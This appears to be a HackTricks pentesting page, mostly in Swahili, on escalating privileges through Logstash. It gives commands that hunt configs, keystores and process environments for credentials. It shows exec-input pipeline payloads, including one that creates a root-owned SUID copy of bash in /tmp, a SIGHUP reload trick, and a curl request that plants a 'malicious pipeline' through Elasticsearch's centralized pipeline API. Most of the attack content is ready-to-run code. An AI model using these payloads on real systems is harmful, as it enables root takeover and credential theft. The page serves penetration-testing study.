# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash inatumiwa **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinaundwa na hatua za **input**, **filter**, na **output**. Kipengele cha kuvutia kinatokea wakati Logstash inapoendeshwa kwenye mashine iliyovamiwa.

### Pipeline Configuration

Pipelines zimesanidiwa katika faili **/etc/logstash/pipelines.yml**, ambayo inaorodhesha maeneo ya mipangilio ya pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hili faili linaonyesha mahali mafaili ya **.conf**, yaliyoshikilia usanidi wa pipeline, yanayopatikana. Wakati unapotumia **Elasticsearch output module**, ni kawaida kwa **pipelines** kujumuisha **Elasticsearch credentials**, ambazo mara nyingi zinakuwa na mamlaka makubwa kutokana na hitaji la Logstash la kuandika data kwa Elasticsearch. Wildcards katika njia za usanidi zinamruhusu Logstash kutekeleza pipelines zote zinazolingana kwenye saraka iliyobainishwa.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **mafayela yote ndani ya saraka hiyo yanachanganywa kwa mpangilio wa alfabeti (lexicographical order) na kuchambuliwa kama usanidi mmoja**. Hii inaunda maana mbili za kukiuka ulinzi:

- Faili iliyowekwa kama `000-input.conf` au `zzz-output.conf` inaweza kubadilisha jinsi pipeline ya mwisho inavyojengwa
- Faili iliyo na muundo mbaya inaweza kuzuia pipeline nzima isipakuliwe, kwa hivyo validate payloads kwa uangalifu kabla ya kutegemea auto-reload

### Fast Enumeration on a Compromised Host

Kwenye mashine ambapo Logstash imewekwa, angalia kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia angalia kama API ya ufuatiliaji ya ndani inapatikana. Kwa chaguo-msingi inasikiliza **127.0.0.1:9600**, ambayo kawaida inatosha baada ya kuingia kwenye mwenyeji:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Hii kwa kawaida inakupa pipeline IDs, maelezo ya runtime, na uthibitisho kwamba pipeline uliyobadilisha imeloadiwa.

Vyeti zilizopatikana kutoka Logstash kwa kawaida hufungua **Elasticsearch**, kwa hivyo angalia [ukurasa mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation kupitia Writable Pipelines

Ili kujaribu Privilege Escalation, kwanza tambua mtumiaji ambaye huduma ya Logstash inaendeshwa chini yake, kwa kawaida ni mtumiaji wa **logstash**. Hakikisha unakidhi **moja** ya vigezo vifuatavyo:

- Kuwa na **write access** kwa faili ya pipeline **.conf** **au**
- Faili **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folda lengwa

Zaidi ya hayo, **moja** ya masharti haya lazima yatimizwe:

- Uwezo wa kuanzisha tena huduma ya Logstash **au**
- Faili **/etc/logstash/logstash.yml** ina **config.reload.automatic: true** imewekwa

Ikiwa kuna wildcard katika usanidi, kuunda faili inayolingana na wildcard hii kunaruhusu command execution. Kwa mfano:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** inaamua mara ya utekelezaji kwa sekunde. Katika mfano uliotolewa, amri ya **whoami** inaendeshwa kila sekunde 120, na pato lake limeelekezwa kwa **/tmp/output.log**.

Kwa **config.reload.automatic: true** ndani ya **/etc/logstash/logstash.yml**, Logstash itagundua kiotomatiki na kutekeleza mipangilio mipya au iliyorekebishwa ya pipeline bila kuhitaji kuanzisha upya. Iwapo hakuna wildcard, bado mabadiliko yanaweza kufanywa kwenye mipangilio iliyopo, lakini inashauriwa kuchukua tahadhari ili kuepuka kusababisha usumbufu.

### Payloads za Pipeline Zinazotegemewa Zaidi

Plugin ya input `exec` bado inafanya kazi katika releases za sasa na inahitaji ama `interval` au `schedule`. Inatekelezwa kwa **forking** ya Logstash JVM, hivyo ikiwa kumbukumbu ni finyu payload yako inaweza kushindwa kwa kosa la `ENOMEM` badala ya kukimbia kimya.

Payload ya privilege-escalation inayofaa zaidi kwa vitendo kwa kawaida huwa ile inayoacha artifact ya kudumu:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna ruhusa za kuanzisha upya lakini unaweza kutuma ishara kwa mchakato, Logstash pia inaunga mkono kupakia upya kuchochewa na **SIGHUP** kwenye mifumo zinazofanana na Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Tambua kwamba si kila plugin inaruhusu reload. Kwa mfano, input ya **stdin** inazuia reload moja kwa moja, kwa hivyo usidhani `config.reload.automatic` itaona mabadiliko yako kila wakati.

### Kupora Siri kutoka Logstash

Kabla ya kuzingatia utekelezaji wa code pekee, kusanya data ambazo Logstash tayari ina ufikiaji wa:

- Uthibitisho wazi (plaintext) mara nyingi huwa imehardcoded ndani ya `elasticsearch {}` outputs, `http_poller`, JDBC inputs, au settings zinazohusiana na cloud
- Mipangilio salama inaweza kuwepo katika **`/etc/logstash/logstash.keystore`** au katika directory nyingine ya `path.settings`
- Nenosiri la keystore mara nyingi hutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na installs zinazotokana na package mara nyingi linachukuliwa kutoka **`/etc/sysconfig/logstash`**
- Upanuko wa environment-variable kwa `${VAR}` unatatuliwa wakati Logstash inapoanza, kwa hivyo mazingira ya huduma yanastahili kuchunguzwa

Ukaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hii pia inafaa kukaguliwa kwa sababu **CVE-2023-46672** ilionyesha kuwa Logstash inaweza kurekodi taarifa nyeti katika logs chini ya mazingira maalum. Kwenye host ya post-exploitation, logs za zamani za Logstash na `journald` entries zinaweza kwa hivyo kufichua credentials hata kama config ya sasa inarejea keystore badala ya kuhifadhi secrets inline.

### Matumizi Mabaya ya Centralized Pipeline Management

Katika baadhi ya mazingira, host haitegemei kabisa faili za ndani za `.conf`. Ikiwa **`xpack.management.enabled: true`** imewekwa, Logstash inaweza kuvuta centrally managed pipelines kutoka Elasticsearch/Kibana, na baada ya kuwezesha mode hii local pipeline configs hayataendelea kuwa chanzo cha ukweli.

Hilo linamaanisha njia tofauti ya shambulio:

1. Recover Elastic credentials kutoka local Logstash settings, the keystore, au logs
2. Thibitisha kama akaunti ina cluster privilege ya **`manage_logstash_pipelines`**
3. Create au replace centrally managed pipeline ili Logstash host itekeleze payload yako kwenye poll interval inayofuata

Elasticsearch API inayotumika kwa kipengele hiki ni:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Hii ni muhimu hasa wakati faili za ndani ni za kusomwa tu, lakini Logstash tayari imesajiliwa kuvuta pipelines kwa mbali.

## Marejeo

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
